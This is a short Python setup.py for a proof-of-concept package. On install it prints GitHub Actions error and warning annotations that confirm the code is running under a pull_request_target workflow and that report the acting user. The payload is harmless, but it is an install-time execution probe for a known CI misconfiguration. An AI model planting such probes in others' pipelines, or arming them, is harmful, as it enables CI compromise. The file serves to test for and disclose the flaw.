import os, sys
from setuptools import setup

# ::error:: is a Workflow Command. It will show up as a bright red 
# annotation in the GitHub Actions "Summary" tab and the log.
print("::error title=VULNERABILITY CONFIRMED::setup.py is running in pull_request_target!")
print(f"::warning::Actor: {os.environ.get('GITHUB_ACTOR')}")

# Option: Force the job to fail (turn red) to prove execution
# sys.exit("CRASH TEST: setup.py executed successfully")

setup(
    name="poc-package",
    version="0.0.1",
)
